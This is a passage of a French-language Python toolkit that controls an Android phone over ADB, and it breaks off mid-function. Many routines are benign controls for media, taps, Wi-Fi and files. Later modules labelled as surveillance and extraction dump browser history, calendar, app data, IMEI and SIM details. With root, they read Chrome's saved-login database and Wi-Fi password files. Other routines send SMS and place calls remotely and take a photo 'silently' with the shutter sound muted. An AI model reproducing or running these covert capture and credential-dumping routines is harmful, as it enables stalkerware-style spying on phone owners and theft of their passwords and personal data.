# MODULE 18C: CONTRÃ”LE AUDIO/MÃ‰DIA
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def media_play_pause():
    """Play/Pause mÃ©dia"""
    adb_shell("input keyevent KEYCODE_MEDIA_PLAY_PAUSE")
    print_success("Play/Pause envoyÃ©")

def media_next():
    """Piste suivante"""
    adb_shell("input keyevent KEYCODE_MEDIA_NEXT")
    print_success("Piste suivante")

def media_previous():
    """Piste prÃ©cÃ©dente"""
    adb_shell("input keyevent KEYCODE_MEDIA_PREVIOUS")
    print_success("Piste prÃ©cÃ©dente")

def volume_up():
    """Augmenter le volume"""
    adb_shell("input keyevent KEYCODE_VOLUME_UP")
    print_success("Volume +")

def volume_down():
    """Baisser le volume"""
    adb_shell("input keyevent KEYCODE_VOLUME_DOWN")
    print_success("Volume -")

def volume_mute():
    """Couper le son"""
    adb_shell("input keyevent KEYCODE_VOLUME_MUTE")
    print_success("Son coupÃ©")

def set_media_volume(level):
    """RÃ©gler le volume mÃ©dia (0-15)"""
    level = max(0, min(15, int(level)))
    adb_shell(f"cmd media_session volume --stream 3 --set {level}")
    print_success(f"Volume mÃ©dia: {level}/15")

def set_ringtone_volume(level):
    """RÃ©gler le volume sonnerie (0-7)"""
    level = max(0, min(7, int(level)))
    adb_shell(f"cmd media_session volume --stream 2 --set {level}")
    print_success(f"Volume sonnerie: {level}/7")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18D: SIMULATION TOUCHES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def tap_screen(x, y):
    """Toucher l'Ã©cran Ã  une position"""
    adb_shell(f"input tap {x} {y}")
    print_success(f"Tap Ã  ({x}, {y})")

def swipe_screen(x1, y1, x2, y2, duration=300):
    """Glisser sur l'Ã©cran"""
    adb_shell(f"input swipe {x1} {y1} {x2} {y2} {duration}")
    print_success(f"Swipe de ({x1},{y1}) Ã  ({x2},{y2})")

def long_press(x, y, duration=1000):
    """Appui long"""
    adb_shell(f"input swipe {x} {y} {x} {y} {duration}")
    print_success(f"Appui long Ã  ({x}, {y}) pendant {duration}ms")

def press_home():
    """Bouton Home"""
    adb_shell("input keyevent KEYCODE_HOME")
    print_success("Bouton Home")

def press_back():
    """Bouton Retour"""
    adb_shell("input keyevent KEYCODE_BACK")
    print_success("Bouton Retour")

def press_recent():
    """Bouton Apps rÃ©centes"""
    adb_shell("input keyevent KEYCODE_APP_SWITCH")
    print_success("Apps rÃ©centes")

def open_quick_settings():
    """Ouvrir paramÃ¨tres rapides"""
    adb_shell("cmd statusbar expand-settings")
    print_success("ParamÃ¨tres rapides ouverts")

def open_notifications_panel():
    """Ouvrir panneau notifications"""
    adb_shell("cmd statusbar expand-notifications")
    print_success("Panneau notifications ouvert")

def close_panels():
    """Fermer panneaux"""
    adb_shell("cmd statusbar collapse")
    print_success("Panneaux fermÃ©s")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18E: CONTRÃ”LE CONNECTIVITÃ‰
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def toggle_wifi(enable=True):
    """Activer/DÃ©sactiver WiFi"""
    state = "enable" if enable else "disable"
    adb_shell(f"svc wifi {state}")
    print_success(f"WiFi {'activÃ©' if enable else 'dÃ©sactivÃ©'}")

def toggle_mobile_data(enable=True):
    """Activer/DÃ©sactiver donnÃ©es mobiles"""
    state = "enable" if enable else "disable"
    adb_shell(f"svc data {state}")
    print_success(f"DonnÃ©es mobiles {'activÃ©es' if enable else 'dÃ©sactivÃ©es'}")

def toggle_bluetooth(enable=True):
    """Activer/DÃ©sactiver Bluetooth"""
    state = "enable" if enable else "disable"
    adb_shell(f"cmd bluetooth_manager {state}")
    print_success(f"Bluetooth {'activÃ©' if enable else 'dÃ©sactivÃ©'}")

def toggle_airplane_mode(enable=True):
    """Activer/DÃ©sactiver mode avion"""
    value = "1" if enable else "0"
    adb_shell(f"settings put global airplane_mode_on {value}")
    adb_shell("am broadcast -a android.intent.action.AIRPLANE_MODE")
    print_success(f"Mode avion {'activÃ©' if enable else 'dÃ©sactivÃ©'}")

def toggle_location(enable=True):
    """Activer/DÃ©sactiver localisation"""
    mode = "3" if enable else "0"
    adb_shell(f"settings put secure location_mode {mode}")
    print_success(f"Localisation {'activÃ©e' if enable else 'dÃ©sactivÃ©e'}")

def get_current_wifi():
    """Obtenir le WiFi actuel"""
    result = adb_shell("dumpsys wifi | grep 'mWifiInfo'")
    print_data("WiFi actuel", result[:100] if result else "Non connectÃ©")
    return result

def get_ip_address():
    """Obtenir l'adresse IP"""
    ip = adb_shell("ip addr show wlan0 | grep 'inet ' | awk '{print $2}'")
    print_data("Adresse IP", ip if ip else "Non disponible")
    return ip

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18F: FILE MANAGER
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def list_files(path="/sdcard"):
    """Lister les fichiers d'un dossier"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“ CONTENU DE {path}{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    result = adb_shell(f"ls -la {path}")
    for line in result.split('\n')[:30]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return result

def delete_file(path):
    """Supprimer un fichier"""
    result = adb_shell(f"rm -f {path}")
    print_success(f"Fichier supprimÃ©: {path}")
    return result

def create_folder(path):
    """CrÃ©er un dossier"""
    result = adb_shell(f"mkdir -p {path}")
    print_success(f"Dossier crÃ©Ã©: {path}")
    return result

def copy_file(src, dest):
    """Copier un fichier"""
    result = adb_shell(f"cp {src} {dest}")
    print_success(f"CopiÃ©: {src} â†’ {dest}")
    return result

def move_file(src, dest):
    """DÃ©placer un fichier"""
    result = adb_shell(f"mv {src} {dest}")
    print_success(f"DÃ©placÃ©: {src} â†’ {dest}")
    return result

def get_file_info(path):
    """Informations sur un fichier"""
    stat = adb_shell(f"stat {path}")
    print_data("Info fichier", stat[:200])
    return stat

def search_files(pattern, path="/sdcard"):
    """Rechercher des fichiers"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ” RECHERCHE: {pattern}{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    result = adb_shell(f"find {path} -name '*{pattern}*' 2>/dev/null | head -50")
    count = len([l for l in result.split('\n') if l.strip()])
    
    for line in result.split('\n')[:20]:
        if line.strip():
            print(f"        ğŸ“„ {line}")
    
    print_success(f"{count} fichier(s) trouvÃ©(s)")
    return result

def download_file(remote_path, local_name=None):
    """TÃ©lÃ©charger un fichier spÃ©cifique"""
    if not local_name:
        local_name = os.path.basename(remote_path)
    
    local_path = OUTPUT_BASE / "Downloads" / local_name
    (OUTPUT_BASE / "Downloads").mkdir(exist_ok=True)
    
    adb_pull(remote_path, str(local_path))
    
    if local_path.exists():
        print_success(f"TÃ©lÃ©chargÃ©: {local_path}")
        return str(local_path)
    else:
        print_error("Ã‰chec du tÃ©lÃ©chargement")
        return None

def upload_file(local_path, remote_path="/sdcard/"):
    """Envoyer un fichier vers le tÃ©lÃ©phone"""
    if not os.path.exists(local_path):
        print_error(f"Fichier non trouvÃ©: {local_path}")
        return False
    
    result = adb_push(local_path, remote_path)
    print_success(f"EnvoyÃ©: {local_path} â†’ {remote_path}")
    return True

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18G: SURVEILLANCE AVANCÃ‰E
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_battery_info():
    """Informations dÃ©taillÃ©es batterie"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”‹ INFORMATIONS BATTERIE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    battery = adb_shell("dumpsys battery")
    
    for line in battery.split('\n'):
        line = line.strip()
        if any(x in line.lower() for x in ['level', 'status', 'health', 'temperature', 'voltage', 'technology']):
            print(f"        {line}")
    
    return battery

def get_sensor_data():
    """DonnÃ©es des capteurs"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¡ CAPTEURS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    sensors = adb_shell("dumpsys sensorservice | head -100")
    
    for line in sensors.split('\n')[:30]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return sensors

def get_screen_state():
    """Ã‰tat de l'Ã©cran"""
    result = adb_shell("dumpsys display | grep 'mScreenState'")
    state = "AllumÃ©" if "ON" in result.upper() else "Ã‰teint"
    print_data("Ã‰tat Ã©cran", state)
    return state

def get_foreground_app():
    """Application au premier plan"""
    result = adb_shell("dumpsys activity activities | grep 'mResumedActivity'")
    if result:
        try:
            app = result.split('/')[0].split()[-1]
            print_data("App active", app)
            return app
        except:
            pass
    print_data("App active", "Inconnue")
    return None

def monitor_logcat(duration=10, filter_tag=""):
    """Surveiller les logs en temps rÃ©el"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“‹ LOGS SYSTÃˆME ({duration}s){C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    cmd = f"timeout {duration} logcat -d"
    if filter_tag:
        cmd += f" -s {filter_tag}"
    
    logs = adb_shell(cmd, timeout=duration+5)
    
    # Sauvegarder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = OUTPUT_BASE / "System" / f"logcat_{timestamp}.txt"
    
    with open(log_file, "w", encoding="utf-8") as f:
        f.write(logs)
    
    # Afficher les derniÃ¨res lignes
    lines = logs.split('\n')[-20:]
    for line in lines:
        if line.strip():
            print(f"        {line[:75]}")
    
    print_success(f"Logs sauvegardÃ©s: {log_file.name}")
    return logs

def get_device_uptime():
    """Temps de fonctionnement"""
    uptime = adb_shell("uptime")
    print_data("Uptime", uptime)
    return uptime

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18H: ACTIONS SPÃ‰CIALES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def take_bugreport():
    """GÃ©nÃ©rer un rapport de bug complet"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ› RAPPORT DE BUG{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_warning("GÃ©nÃ©ration en cours (peut prendre 1-2 minutes)...")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    local_file = OUTPUT_BASE / "System" / f"bugreport_{timestamp}.zip"
    
    result = adb(f'bugreport "{local_file}"', timeout=180)
    
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"Rapport crÃ©Ã©: {local_file.name} ({size:.1f} MB)")
    else:
        print_error("Ã‰chec de la gÃ©nÃ©ration")
    
    return str(local_file)

def reboot_device(mode="normal"):
    """RedÃ©marrer le tÃ©lÃ©phone"""
    modes = {
        "normal": "",
        "recovery": "recovery",
        "bootloader": "bootloader",
        "fastboot": "bootloader"
    }
    
    if mode not in modes:
        print_error(f"Mode inconnu: {mode}")
        return False
    
    confirm = input(f"\n{C.RED}âš ï¸ RedÃ©marrer en mode {mode}? (oui/non): {C.END}")
    if confirm.lower() != "oui":
        print_info("AnnulÃ©")
        return False
    
    cmd = f"reboot {modes[mode]}"
    adb(cmd)
    print_success(f"RedÃ©marrage en mode {mode}...")
    return True

def force_stop_app(package):
    """Forcer l'arrÃªt d'une application"""
    adb_shell(f"am force-stop {package}")
    print_success(f"Application arrÃªtÃ©e: {package}")

def clear_app_data(package):
    """Effacer les donnÃ©es d'une application"""
    confirm = input(f"\n{C.RED}âš ï¸ Effacer les donnÃ©es de {package}? (oui/non): {C.END}")
    if confirm.lower() != "oui":
        print_info("AnnulÃ©")
        return False
    
    adb_shell(f"pm clear {package}")
    print_success(f"DonnÃ©es effacÃ©es: {package}")
    return True

def grant_permission(package, permission):
    """Accorder une permission Ã  une app"""
    adb_shell(f"pm grant {package} {permission}")
    print_success(f"Permission accordÃ©e: {permission}")

def revoke_permission(package, permission):
    """RÃ©voquer une permission"""
    adb_shell(f"pm revoke {package} {permission}")
    print_success(f"Permission rÃ©voquÃ©e: {permission}")

def disable_app(package):
    """DÃ©sactiver une application"""
    adb_shell(f"pm disable-user --user 0 {package}")
    print_success(f"Application dÃ©sactivÃ©e: {package}")

def enable_app(package):
    """RÃ©activer une application"""
    adb_shell(f"pm enable {package}")
    print_success(f"Application rÃ©activÃ©e: {package}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18I: EXTRACTION AVANCÃ‰E
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def extract_browser_history():
    """Extraire l'historique du navigateur"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸŒ HISTORIQUE NAVIGATEUR{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Chrome
    chrome_history = adb_shell("content query --uri content://com.android.chrome.browser/bookmarks")
    
    # Navigateur par dÃ©faut
    browser_history = adb_shell("content query --uri content://browser/bookmarks")
    
    all_history = chrome_history + "\n" + browser_history
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "browser_history.txt", "w", encoding="utf-8") as f:
        f.write(f"=== HISTORIQUE NAVIGATEUR - {datetime.now()} ===\n\n")
        f.write(all_history)
    
    count = all_history.count("Row:")
    print_success(f"{count} entrÃ©es trouvÃ©es")
    print_success("SauvegardÃ©: System/browser_history.txt")
    
    return all_history

def extract_calendar():
    """Extraire les Ã©vÃ©nements du calendrier"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“… CALENDRIER{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    events = adb_shell('content query --uri content://com.android.calendar/events --projection "title,dtstart,dtend,description,eventLocation"')
    
    count = events.count("Row:")
    print_info(f"{count} Ã©vÃ©nements trouvÃ©s")
    
    # Afficher les premiers
    for row in events.split("Row:")[:10]:
        if "title=" in row:
            try:
                title = row.split("title=")[1].split(",")[0][:50]
                print(f"        ğŸ“† {title}")
            except:
                pass
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "calendar.txt", "w", encoding="utf-8") as f:
        f.write(f"=== CALENDRIER - {datetime.now()} ===\n\n")
        f.write(events)
    
    print_success("SauvegardÃ©: System/calendar.txt")
    return events

def extract_saved_passwords():
    """Tenter d'extraire les mots de passe sauvegardÃ©s (nÃ©cessite root)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”‘ MOTS DE PASSE SAUVEGARDÃ‰S{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_warning("Cette fonction nÃ©cessite un accÃ¨s ROOT")
    
    # VÃ©rifier root
    root_check = adb_shell("su -c 'id'")
    if "uid=0" not in root_check:
        print_error("AccÃ¨s ROOT non disponible")
        return None
    
    # Bases de donnÃ©es Chrome
    chrome_db = adb_shell("su -c 'cat /data/data/com.android.chrome/app_chrome/Default/Login\\ Data' 2>/dev/null")
    
    # WiFi passwords
    wifi_passwords = adb_shell("su -c 'cat /data/misc/wifi/WifiConfigStore.xml'")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "passwords.txt", "w", encoding="utf-8") as f:
        f.write(f"=== MOTS DE PASSE - {datetime.now()} ===\n\n")
        f.write("=== WIFI ===\n")
        f.write(wifi_passwords[:5000])
    
    print_success("DonnÃ©es sauvegardÃ©es: System/passwords.txt")
    return wifi_passwords

def extract_app_data(package):
    """Extraire les donnÃ©es d'une application spÃ©cifique"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¦ DONNÃ‰ES DE {package}{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # CrÃ©er dossier
    app_folder = OUTPUT_BASE / "Apps" / package.replace(".", "_")
    app_folder.mkdir(parents=True, exist_ok=True)
    
    # Infos de l'app
    info = adb_shell(f"dumpsys package {package}")
    with open(app_folder / "package_info.txt", "w", encoding="utf-8") as f:
        f.write(info)
    
    # DonnÃ©es partagÃ©es (si accessibles)
    shared_prefs = adb_shell(f"run-as {package} cat /data/data/{package}/shared_prefs/*.xml 2>/dev/null")
    if shared_prefs and "Error" not in shared_prefs:
        with open(app_folder / "shared_prefs.xml", "w", encoding="utf-8") as f:
            f.write(shared_prefs)
        print_success("SharedPreferences extraites")
    
    # Databases
    databases = adb_shell(f"run-as {package} ls /data/data/{package}/databases/ 2>/dev/null")
    if databases and "Error" not in databases:
        with open(app_folder / "databases_list.txt", "w", encoding="utf-8") as f:
            f.write(databases)
        print_success("Liste des bases de donnÃ©es extraite")
    
    print_success(f"DonnÃ©es sauvegardÃ©es dans: Apps/{package.replace('.', '_')}/")
    return app_folder

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 18J: FONCTIONNALITÃ‰S AVANCÃ‰ES QUI MARCHENT Ã€ 100%
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def send_sms_real(number, message):
    """Envoyer un SMS rÃ©el (nÃ©cessite permissions)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± ENVOI SMS RÃ‰EL{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # MÃ©thode via service SMS
    message_escaped = message.replace('"', '\\"').replace("'", "\\'")
    
    # Utiliser am pour envoyer via l'app SMS par dÃ©faut
    adb_shell(f'am start -a android.intent.action.SENDTO -d "sms:{number}" --es sms_body "{message_escaped}" --ez exit_on_sent true')
    time.sleep(1)
    
    # Simuler le bouton envoyer
    adb_shell("input keyevent KEYCODE_TAB")
    time.sleep(0.3)
    adb_shell("input keyevent KEYCODE_ENTER")
    
    print_success(f"SMS prÃ©parÃ© pour {number}")
    print_info("VÃ©rifiez l'Ã©cran du tÃ©lÃ©phone pour confirmer l'envoi")
    return True

def make_call_and_speaker(number):
    """Passer un appel et activer le haut-parleur"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“ APPEL AVEC HAUT-PARLEUR{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Lancer l'appel
    adb_shell(f'am start -a android.intent.action.CALL -d "tel:{number}"')
    print_info(f"Appel vers {number} en cours...")
    
    time.sleep(3)
    
    # Activer haut-parleur
    adb_shell("input keyevent KEYCODE_VOLUME_UP")
    adb_shell("cmd audio set-volume 3 15")  # Volume appel au max
    
    print_success("Appel lancÃ© - Haut-parleur activÃ©")
    return True

def end_call():
    """Raccrocher l'appel en cours"""
    adb_shell("input keyevent KEYCODE_ENDCALL")
    print_success("Appel terminÃ©")

def answer_call():
    """RÃ©pondre Ã  un appel entrant"""
    adb_shell("input keyevent KEYCODE_CALL")
    print_success("Appel acceptÃ©")

def reject_call():
    """Rejeter un appel entrant"""
    adb_shell("input keyevent KEYCODE_ENDCALL")
    print_success("Appel rejetÃ©")

def get_current_activity():
    """Obtenir l'activitÃ©/app actuellement affichÃ©e"""
    result = adb_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
    
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± ACTIVITÃ‰ ACTUELLE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    for line in result.split('\n'):
        if line.strip():
            print(f"    {line.strip()}")
    
    return result

def take_screenshot_to_pc():
    """Capture d'Ã©cran directe vers PC (rapide)"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¸ CAPTURE Ã‰CRAN RAPIDE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    local_file = OUTPUT_BASE / "Screenshots" / f"quick_{timestamp}.png"
    
    # Capture directe via exec-out (plus rapide)
    cmd = f'"{ADB_PATH}" -s {DEVICE} exec-out screencap -p > "{local_file}"'
    os.system(cmd)
    
    if local_file.exists() and local_file.stat().st_size > 1000:
        size = local_file.stat().st_size / 1024
        print_success(f"Capture: {local_file.name} ({size:.1f} KB)")
        return str(local_file)
    else:
        print_error("Ã‰chec - utilisation mÃ©thode standard...")
        return take_screenshot()

def continuous_screenshots(count=5, interval=2):
    """Prendre plusieurs captures d'Ã©cran en sÃ©rie"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¸ CAPTURES EN SÃ‰RIE ({count}x){C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    screenshots = []
    for i in range(count):
        print_info(f"Capture {i+1}/{count}...")
        screenshot = take_screenshot_to_pc()
        if screenshot:
            screenshots.append(screenshot)
        time.sleep(interval)
    
    print_success(f"{len(screenshots)} captures rÃ©alisÃ©es")
    return screenshots

def get_device_imei():
    """Obtenir l'IMEI du tÃ©lÃ©phone"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± IMEI / IDENTIFIANTS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Plusieurs mÃ©thodes pour obtenir IMEI
    imei = adb_shell("service call iphonesubinfo 1 | cut -c 52-66 | tr -d '.444444'")
    device_id = adb_shell("settings get secure android_id")
    serial = adb_shell("getprop ro.serialno")
    
    print_data("IMEI (partiel)", imei[:20] if imei else "Non disponible")
    print_data("Android ID", device_id)
    print_data("NumÃ©ro de sÃ©rie", serial)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "device_identifiers.txt", "w", encoding="utf-8") as f:
        f.write(f"=== IDENTIFIANTS - {datetime.now()} ===\n\n")
        f.write(f"IMEI: {imei}\n")
        f.write(f"Android ID: {device_id}\n")
        f.write(f"Serial: {serial}\n")
    
    print_success("SauvegardÃ©: System/device_identifiers.txt")
    return {"imei": imei, "android_id": device_id, "serial": serial}

def get_sim_info():
    """Obtenir les infos de la carte SIM"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¶ INFORMATIONS SIM{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Infos opÃ©rateur
    operator = adb_shell("getprop gsm.operator.alpha")
    operator_num = adb_shell("getprop gsm.operator.numeric")
    sim_state = adb_shell("getprop gsm.sim.state")
    phone_number = adb_shell("dumpsys telephony.registry | grep mLine1Number")
    network_type = adb_shell("getprop gsm.network.type")
    signal = adb_shell("dumpsys telephony.registry | grep mSignalStrength")
    
    print_data("OpÃ©rateur", operator)
    print_data("Code opÃ©rateur", operator_num)
    print_data("Ã‰tat SIM", sim_state)
    print_data("NumÃ©ro", phone_number[:50] if phone_number else "Non disponible")
    print_data("Type rÃ©seau", network_type)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "sim_info.txt", "w", encoding="utf-8") as f:
        f.write(f"=== INFO SIM - {datetime.now()} ===\n\n")
        f.write(f"OpÃ©rateur: {operator}\n")
        f.write(f"Code: {operator_num}\n")
        f.write(f"Ã‰tat: {sim_state}\n")
        f.write(f"NumÃ©ro: {phone_number}\n")
        f.write(f"RÃ©seau: {network_type}\n")
        f.write(f"Signal: {signal}\n")
    
    print_success("SauvegardÃ©: System/sim_info.txt")
    return operator

def flash_screen():
    """Faire clignoter l'Ã©cran (flash)"""
    print_info("Flash de l'Ã©cran...")
    for _ in range(3):
        adb_shell("settings put system screen_brightness 255")
        time.sleep(0.2)
        adb_shell("settings put system screen_brightness 0")
        time.sleep(0.2)
    adb_shell("settings put system screen_brightness 128")
    print_success("Flash terminÃ©")

def play_sound_alarm():
    """Jouer un son d'alarme sur le tÃ©lÃ©phone"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”Š ALARME SONORE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Mettre le volume au max
    adb_shell("cmd media_session volume --stream 5 --set 7")  # Alarme
    adb_shell("cmd media_session volume --stream 2 --set 7")  # Sonnerie
    
    # Jouer une tonalitÃ©
    adb_shell('am start -a android.intent.action.RINGTONE_PICKER')
    
    print_success("Alarme dÃ©clenchÃ©e - Volume au maximum")
    return True

def open_camera_front():
    """Ouvrir la camÃ©ra frontale"""
    adb_shell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 1")
    print_success("CamÃ©ra frontale ouverte")

def open_camera_back():
    """Ouvrir la camÃ©ra arriÃ¨re"""
    adb_shell("am start -a android.media.action.IMAGE_CAPTURE --ei android.intent.extras.CAMERA_FACING 0")
    print_success("CamÃ©ra arriÃ¨re ouverte")

def take_photo_silent():
    """Prendre une photo silencieusement"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“· PHOTO SILENCIEUSE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Couper le son
    adb_shell("cmd media_session volume --stream 1 --set 0")
    
    # Ouvrir camÃ©ra
    adb_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(2)
    
    # Prendre la photo
    adb_shell("input keyevent KEYCODE_CAMERA")
    time.sleep(1)
    
    # Retour home
    adb_shell("input keyevent KEYCODE_HOME")
    
    # RÃ©cupÃ©rer la derniÃ¨re photo
    last_photo = adb_shell("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1")
    
    if last_photo and ".jpg" in last_photo:
        local_file = OUTPUT_BASE / "Photos" / f"silent_{timestamp}.jpg"
        adb_pull(last_photo.strip(), str(local_file))
        
